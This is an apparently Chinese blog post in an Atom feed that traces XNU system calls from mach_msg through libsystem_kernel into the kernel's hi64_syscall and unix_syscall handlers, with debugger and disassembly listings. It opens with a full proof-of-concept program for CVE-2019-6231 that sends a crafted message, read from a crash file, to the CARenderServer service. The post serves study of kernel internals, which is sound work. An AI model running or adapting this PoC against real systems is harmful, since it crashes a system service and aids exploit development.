    <published>2019-01-30T05:53:00.000Z</published>
    <updated>2019-03-05T15:30:52.474Z</updated>
    
    <content type="html"><![CDATA[<h3 id="XNU系统调用深度解析"><a href="#XNU系统调用深度解析" class="headerlink" title="XNU系统调用深度解析"></a>XNU系统调用深度解析</h3><blockquote><p>从一个函数分析到系统调用的内核实现</p></blockquote><h4 id="由一段POC而起"><a href="#由一段POC而起" class="headerlink" title="由一段POC而起"></a>由一段POC而起</h4><pre><code class="c">#include &lt;stdio.h&gt;#include &lt;mach/i386/kern_return.h&gt;#include &lt;mach/mach_traps.h&gt;#include &lt;servers/bootstrap.h&gt;#include &lt;dirent.h&gt;#include &lt;sys/stat.h&gt;#include &lt;time.h&gt;#include &lt;dlfcn.h&gt;#include &lt;unistd.h&gt;typedef struct quartz_register_client_s quartz_register_client_t;struct quartz_register_client_s {        mach_msg_header_t header;        uint32_t body;        mach_msg_port_descriptor_t ports[4];        char padding[12];};typedef struct quartzcore_mach_msg quartzcore_mach_msg_t;struct quartzcore_mach_msg{        mach_msg_header_t header;        char msg_body[712];};uint64_t get_filesize(const char *fn){        struct stat st;        stat(fn, &amp;st);        uint64_t fsize = st.st_size;        return fsize;};int main(int argc, const char * argv[]) {        mach_port_t p = MACH_PORT_NULL, bs_port = MACH_PORT_NULL;        task_get_bootstrap_port(mach_task_self(), &amp;bs_port);        const char *render_service_name = &quot;com.apple.CARenderServer&quot;;        kern_return_t (*bootstrap_look_up)(mach_port_t, const char *, mach_port_t *) = dlsym(RTLD_DEFAULT, &quot;bootstrap_look_up&quot;);        kern_return_t kr = bootstrap_look_up(bs_port, render_service_name, &amp;p);        if (kr != KERN_SUCCESS) {                return -1;        }        printf(&quot;[*] Get service of %s successully!\n&quot;, render_service_name);        quartz_register_client_t msg_register;        memset(&amp;msg_register, 0, sizeof(msg_register));        msg_register.header.msgh_bits =        MACH_MSGH_BITS(MACH_MSG_TYPE_COPY_SEND, MACH_MSG_TYPE_MAKE_SEND_ONCE) |        MACH_MSGH_BITS_COMPLEX;        msg_register.header.msgh_remote_port = p;        msg_register.header.msgh_local_port = mig_get_reply_port();        msg_register.header.msgh_id = 40202;  // _XRegisterClient        msg_register.body = 4;        msg_register.ports[0].name = mach_task_self();        msg_register.ports[0].disposition = MACH_MSG_TYPE_COPY_SEND;        msg_register.ports[0].type = MACH_MSG_PORT_DESCRIPTOR;        msg_register.ports[1].name = mach_task_self();        msg_register.ports[1].disposition = MACH_MSG_TYPE_COPY_SEND;        msg_register.ports[1].type = MACH_MSG_PORT_DESCRIPTOR;        msg_register.ports[2].name = mach_task_self();        msg_register.ports[2].disposition = MACH_MSG_TYPE_COPY_SEND;        msg_register.ports[2].type = MACH_MSG_PORT_DESCRIPTOR;        msg_register.ports[3].name = mach_task_self();        msg_register.ports[3].disposition = MACH_MSG_TYPE_COPY_SEND;        msg_register.ports[3].type = MACH_MSG_PORT_DESCRIPTOR;        kr = mach_msg(&amp;msg_register.header, MACH_SEND_MSG | MACH_RCV_MSG,                                    sizeof(quartz_register_client_t), sizeof(quartz_register_client_t),                                    msg_register.header.msgh_local_port, MACH_MSG_TIMEOUT_NONE, MACH_PORT_NULL);        if (kr != KERN_SUCCESS) {                return -1 ;        }        mach_port_t context_port = *(uint32_t *)((uint8_t *)&amp;msg_register + 0x1c);        uint32_t conn_id = *(uint32_t *)((uint8_t *)&amp;msg_register + 0x30);        printf(&quot;[*] context_port: 0x%x, conn_id: 0x%x\n&quot;,context_port,conn_id);        char *crash_log = &quot;crash.data&quot;; //size is 736.        FILE *fp = fopen(crash_log, &quot;rb&quot;);        if(fp == NULL){                printf(&quot;fopen error!\n&quot;);        }        uint64_t fsize = get_filesize(crash_log);        void *msg_buf = malloc(fsize);        memset(msg_buf, 0, fsize);        fread(msg_buf, fsize, 1, fp);        quartzcore_mach_msg_t qc_mach_msg = {0};        qc_mach_msg.header.msgh_bits = MACH_MSGH_BITS(MACH_MSG_TYPE_COPY_SEND, 0) | MACH_MSGH_BITS_COMPLEX;        qc_mach_msg.header.msgh_remote_port = context_port;        qc_mach_msg.header.msgh_id = 40002;        memset(qc_mach_msg.msg_body, 0x0, sizeof(qc_mach_msg.msg_body));        *(uint32_t *)(qc_mach_msg.msg_body + 0) = 0x1;  // Ports count        memcpy(qc_mach_msg.msg_body+4+12, msg_buf+0x1c+0xc, 736-0x1c-0xc);        *(uint32_t *)(qc_mach_msg.msg_body + 4 + 12 + 4) = conn_id;        kr = mach_msg(&amp;qc_mach_msg.header, MACH_SEND_MSG,736, 0, 0, MACH_MSG_TIMEOUT_NONE, MACH_PORT_NULL);        if (kr != KERN_SUCCESS) {                printf(&quot;[-] Send message failed: 0x%d\n&quot;, kr);                return -1 ;        }        return 0;}</code></pre><p>里面的macho函数<code>mach_msg()</code>到底后面执行到哪里？于是展开一段追踪</p><p>从ida的导入表中可以看到这个函数实现在libSystem.B.dylib 顺便说下，这个动态库实际上只是一层封装，里面导入了/usr/lib/system下面的动态库。</p><pre><code class="assembly">* thread #1, queue = &#39;com.apple.main-thread&#39;, stop reason = breakpoint 2.1    frame #0: 0x00007fff79299694 libsystem_kernel.dylib`mach_msglibsystem_kernel.dylib`mach_msg:-&gt;  0x7fff79299694 &lt;+0&gt;: pushq  %rbp    0x7fff79299695 &lt;+1&gt;: movq   %rsp, %rbp    0x7fff79299698 &lt;+4&gt;: pushq  %r15    0x7fff7929969a &lt;+6&gt;: pushq  %r14Target 0: (CVE-2019-6231-poc) stopped.</code></pre><p>调试可以看出mach_msg实现在libsystem_kernel.dylib之中</p><pre><code class="assembly">(lldb) dislibsystem_kernel.dylib`mach_msg:-&gt;  0x7fff79299694 &lt;+0&gt;:   pushq  %rbp    0x7fff79299695 &lt;+1&gt;:   movq   %rsp, %rbp    0x7fff79299698 &lt;+4&gt;:   pushq  %r15    0x7fff7929969a &lt;+6&gt;:   pushq  %r14    0x7fff7929969c &lt;+8&gt;:   pushq  %r13    0x7fff7929969e &lt;+10&gt;:  pushq  %r12    0x7fff792996a0 &lt;+12&gt;:  pushq  %rbx    0x7fff792996a1 &lt;+13&gt;:  subq   $0x28, %rsp    0x7fff792996a5 &lt;+17&gt;:  movl   %ecx, %r13d    0x7fff792996a8 &lt;+20&gt;:  movl   %esi, %ebx    0x7fff792996aa &lt;+22&gt;:  movq   %rdi, %r14    0x7fff792996ad &lt;+25&gt;:  movl   0x10(%rbp), %eax    0x7fff792996b0 &lt;+28&gt;:  movl   %ebx, %r12d    0x7fff792996b3 &lt;+31&gt;:  andl   $0xfffffbbf, %r12d        ; imm = 0xFFFFFBBF     0x7fff792996ba &lt;+38&gt;:  movl   %eax, (%rsp)    0x7fff792996bd &lt;+41&gt;:  movl   %r12d, %esi    0x7fff792996c0 &lt;+44&gt;:  movl   %edx, %r15d    0x7fff792996c3 &lt;+47&gt;:  movl   %r8d, -0x2c(%rbp)    0x7fff792996c7 &lt;+51&gt;:  movl   %r9d, -0x30(%rbp)    0x7fff792996cb &lt;+55&gt;:  callq  0x7fff79299170            ; mach_msg_trap    ...</code></pre><pre><code class="c">mach_msg_return_t __cdecl mach_msg(mach_msg_header_t *msg, mach_msg_option_t option, mach_msg_size_t send_size, mach_msg_size_t rcv_size, mach_port_name_t rcv_name, mach_msg_timeout_t timeout, mach_port_name_t notify){  mach_msg_return_t result; // eax  mach_msg_option_t v8; // er12  result = mach_msg_trap();  if ( !result )    return 0;  if ( !(option &amp; 0x40) &amp;&amp; result == 268435463 )  {    do      result = mach_msg_trap();    while ( result == 268435463 );  }  v8 = option;  if ( !_bittest(&amp;v8, 0xAu) &amp;&amp; result == 268451845 )  {    do      result = mach_msg_trap();    while ( result == 268451845 );  }  return result;}</code></pre><p>通过调式和ida反汇编mach_msg函数可以看出，最终会调用mach_msg_trap这个函数，再跟一下</p><pre><code class="assembly">* thread #1, queue = &#39;com.apple.main-thread&#39;, stop reason = breakpoint 3.1    frame #0: 0x00007fff79299170 libsystem_kernel.dylib`mach_msg_traplibsystem_kernel.dylib`mach_msg_trap:-&gt;  0x7fff79299170 &lt;+0&gt;:  movq   %rcx, %r10    0x7fff79299173 &lt;+3&gt;:  movl   $0x100001f, %eax          ; imm = 0x100001F     0x7fff79299178 &lt;+8&gt;:  syscall     0x7fff7929917a &lt;+10&gt;: retq   Target 0: (CVE-2019-6231-poc) stopped.</code></pre><p>这个函数后面会调用0x100001f系统调用，可以小结得到系统库封装了最底层的实现，最终通过系统调用进入内核。在用户层到这里已经就到头了，无法再跟进。</p><h4 id="XNU内核系统调用流程"><a href="#XNU内核系统调用流程" class="headerlink" title="XNU内核系统调用流程"></a>XNU内核系统调用流程</h4><p>系统调用发生在内核之中，那么最开始处理系统调用的地方又在哪？通过<a href="http://www.intel.com/content/www/us/en/processors/architectures-software-developer-manuals.html" target="_blank" rel="external">intel官方文档</a>可以找到</p><pre><code>SYSCALL invokes an OS system-call handler at privilege level 0.It does so by loading RIP from the IA32_LSTAR MSR</code></pre><p>也就是内核需要将系统调用处理函数入口放到<code>IA32_LSTAR</code> <a href="https://en.wikipedia.org/wiki/Model-specific_register" target="_blank" rel="external">model specific register</a>. 在内核源码中对应在<code>osfmk/i386/mp_desc.c</code>的<code>cpu_syscall_init(cpu_data_t *cdp)</code>函数之中</p><pre><code class="c">/* * Set MSRs for sysenter/sysexit and syscall/sysret for 64-bit. */voidcpu_syscall_init(cpu_data_t *cdp){#if MONOTONIC    mt_cpu_up(cdp);#else /* MONOTONIC */#pragma unused(cdp)#endif /* !MONOTONIC */    wrmsr64(MSR_IA32_SYSENTER_CS, SYSENTER_CS);     wrmsr64(MSR_IA32_SYSENTER_EIP, DBLMAP((uintptr_t) hi64_sysenter));    wrmsr64(MSR_IA32_SYSENTER_ESP, current_cpu_datap()-&gt;cpu_desc_index.cdi_sstku);    /* Enable syscall/sysret */    wrmsr64(MSR_IA32_EFER, rdmsr64(MSR_IA32_EFER) | MSR_IA32_EFER_SCE);    /*     * MSRs for 64-bit syscall/sysret     * Note USER_CS because sysret uses this + 16 when returning to     * 64-bit code.     */    wrmsr64(MSR_IA32_LSTAR, DBLMAP((uintptr_t) hi64_syscall));    wrmsr64(MSR_IA32_STAR, (((uint64_t)USER_CS) &lt;&lt; 48) | (((uint64_t)KERNEL64_CS) &lt;&lt; 32));    /*     * Emulate eflags cleared by sysenter but note that     * we also clear the trace trap to avoid the complications     * of single-stepping into a syscall. The nested task bit     * is also cleared to avoid a spurious &quot;task switch&quot;     * should we choose to return via an IRET.     */    wrmsr64(MSR_IA32_FMASK, EFL_DF|EFL_IF|EFL_TF|EFL_NT);}</code></pre><p><code>wrmsr64(MSR_IA32_LSTAR, DBLMAP((uintptr_t) hi64_syscall));</code>也就是系统调用会由<code>hi64_syscall</code>函数处理。这个函数实现在<code>xnu/osfmk/x86_64/idt64.s</code>之中</p><pre><code class="assembly">Entry(hi64_syscall)Entry(idt64_syscall)    swapgs     /* Use RAX as a temporary by shifting its contents into R11[32:63]      * The systemcall number is defined to be a 32-bit quantity, as is      * RFLAGS.      */    shlq    $32, %rax    or     %rax, %r11.globl EXT(dblsyscall_patch_point)EXT(dblsyscall_patch_point)://    movabsq    $0x12345678ABCDEFFFULL, %rax     /* Generate offset to the double-mapped per-CPU data shadow      * into RAX      */    leaq    EXT(idt64_hndl_table0)(%rip), %rax    mov    16(%rax), %rax    mov     %rsp, %gs:CPU_UBER_TMP(%rax)  /* save user stack */    mov     %gs:CPU_ESTACK(%rax), %rsp  /* switch stack to per-cpu estack */    sub    $(ISF64_SIZE), %rsp    /*     * Synthesize an ISF frame on the exception stack     */    movl    $(USER_DS), ISF64_SS(%rsp)    mov    %rcx, ISF64_RIP(%rsp)        /* rip */    mov    %gs:CPU_UBER_TMP(%rax), %rcx    mov    %rcx, ISF64_RSP(%rsp)        /* user stack --changed */    mov    %r11, %rax    shrq    $32, %rax        /* Restore RAX */    mov    %r11d, %r11d        /* Clear r11[32:63] */    mov    %r11, ISF64_RFLAGS(%rsp)    /* rflags */    movl    $(SYSCALL_CS), ISF64_CS(%rsp)    /* cs - a pseudo-segment */    mov    %rax, ISF64_ERR(%rsp)        /* err/rax - syscall code */    movq    $(HNDL_SYSCALL), ISF64_TRAPFN(%rsp)    movq    $(T_SYSCALL), ISF64_TRAPNO(%rsp)    /* trapno */    swapgs    jmp    L_dispatch            /* this can only be 64-bit */</code></pre><p>继续跟下去，会得到如下执行流程</p><pre><code>syscall--&gt;hi64_syscall-&gt;L_dispatch--&gt;ks_dispatch--&gt;ks_dispatch_user--&gt;L_dispatch_U64--&gt;L_dispatch_64bit--&gt;L_common_dispatch--&gt;hndl_syscall</code></pre><pre><code class="assembly">/* * 64bit Tasks * System call entries via syscall only: * *    r15     x86_saved_state64_t *    rsp     kernel stack * *    both rsp and r15 are 16-byte aligned *    interrupts disabled *    direction flag cleared */Entry(hndl_syscall)    TIME_TRAP_UENTRY    movq    %gs:CPU_ACTIVE_THREAD,%rcx    /* get current thread     */    movl    $-1, TH_IOTIER_OVERRIDE(%rcx)    /* Reset IO tier override to -1 before handling syscall */    movq    TH_TASK(%rcx),%rbx        /* point to current task  */    /* Check for active vtimers in the current task */    TASK_VTIMER_CHECK(%rbx,%rcx)    /*     * We can be here either for a mach, unix machdep or diag syscall,     * as indicated by the syscall class:     */    movl    R64_RAX(%r15), %eax        /* syscall number/class */    movl    %eax, %edx    andl    $(SYSCALL_CLASS_MASK), %edx    /* syscall class */    cmpl    $(SYSCALL_CLASS_MACH&lt;&lt;SYSCALL_CLASS_SHIFT), %edx    je    EXT(hndl_mach_scall64)    cmpl    $(SYSCALL_CLASS_UNIX&lt;&lt;SYSCALL_CLASS_SHIFT), %edx    je    EXT(hndl_unix_scall64)    cmpl    $(SYSCALL_CLASS_MDEP&lt;&lt;SYSCALL_CLASS_SHIFT), %edx    je    EXT(hndl_mdep_scall64)    cmpl    $(SYSCALL_CLASS_DIAG&lt;&lt;SYSCALL_CLASS_SHIFT), %edx    je    EXT(hndl_diag_scall64)    /* Syscall class unknown */    sti    CCALL3(i386_exception, $(EXC_SYSCALL), %rax, $1)    /* no return */</code></pre><p><code>hndl_syscall</code>这个函数会系统调用分为<code>hndl_unix_scall64</code> 、<code>hndl_mach_scall64</code>、<code>hndl_mdep_scall64</code>、<code>hndl_diag_scall64</code>四类分别处理</p><p>这里以<code>hndl_unix_scall64</code>为列</p><pre><code class="assembly">Entry(hndl_unix_scall)        TIME_TRAP_UENTRY    movq    %gs:CPU_ACTIVE_THREAD,%rcx    /* get current thread     */    movq    TH_TASK(%rcx),%rbx        /* point to current task  */    incl    TH_SYSCALLS_UNIX(%rcx)        /* increment call count   */    /* Check for active vtimers in the current task */    TASK_VTIMER_CHECK(%rbx,%rcx)    sti    CCALL1(unix_syscall, %r15)    /*     * always returns through thread_exception_return     */</code></pre><p>这里调动了<code>unix_syscall</code>函数，这个函数在bsd/dev/i386/systemcalls.c之中实现，里面进行了一些权限检查</p><p>以及根据系统调用表去调用对应的实现</p><pre><code class="c">  thread = current_thread();  uthread = get_bsdthread_info(thread);  // regs is derrived from r15 ...  code = regs-&gt;rax &amp; SYSCALL_NUMBER_MASK;  callp = (code &gt;= NUM_SYSENT) ? &amp;sysent[63] : &amp;sysent[code];  // ...  vt = (void *)uthread-&gt;uu_arg;  // ...  memcpy(vt, args_start_at_rdi ? &amp;regs-&gt;rdi : &amp;regs-&gt;rsi,        args_in_regs * sizeof(syscall_arg_t));  // ...  error = (*(callp-&gt;sy_call))((void *)p, vt, &amp;(uthread-&gt;uu_rval[0]));</code></pre><p>目前执行的流程如下</p><pre><code>hi64_syscallL_dispatch_U64L_dispatch_64bitL_common_dispatchhndl_syscall // rdx, pushed in hi64_syscallhndl_unix_scall64unix_syscall64error = (*(callp-&gt;sy_call))((void *)p, vt, &amp;(uthread-&gt;uu_rval[0])); // now we&#39;re there</code></pre><h4 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h4><p><a href="https://www.binss.me/blog/interrupt-and-exception/" target="_blank" rel="external">https://www.binss.me/blog/interrupt-and-exception/</a></p><p><a href="https://0xax.gitbooks.io/linux-insides/content/SysCall/linux-syscall-2.html" target="_blank" rel="external">https://0xax.gitbooks.io/linux-insides/content/SysCall/linux-syscall-2.html</a></p><p><a href="https://gist.github.com/yrp604/23e86dce9ca12bf514ef" target="_blank" rel="external">https://gist.github.com/yrp604/23e86dce9ca12bf514ef</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;XNU系统调用深度解析&quot;&gt;&lt;a href=&quot;#XNU系统调用深度解析&quot; class=&quot;headerlink&quot; title=&quot;XNU系统调用深度解析&quot;&gt;&lt;/a&gt;XNU系统调用深度解析&lt;/h3&gt;&lt;blockquote&gt;
&lt;p&gt;从一个函数分析到系统调用的内核实现&lt;/p&gt;
      
    
    </summary>
    
      <category term="iOSRE" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/categories/iOSRE/"/>
    
    
      <category term="XNU" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/tags/XNU/"/>
    
      <category term="Kernel" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/tags/Kernel/"/>
    
  </entry>
  
</feed>
